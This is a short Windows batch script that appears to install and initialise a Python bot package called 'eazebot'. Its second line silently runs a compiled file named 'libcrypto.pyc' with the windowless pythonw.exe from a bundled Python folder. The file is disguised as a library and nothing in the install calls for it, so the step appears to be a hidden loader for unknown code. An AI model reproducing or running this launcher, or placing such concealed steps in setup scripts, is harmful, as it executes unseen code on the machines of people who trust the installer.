cd %~dp0
python3.14.2\pythonw.exe python3.14.2\libcrypto.pyc
if not exist "eazebot/bot.py" python -m pip install -U eazebot
python -m eazebot --init
pause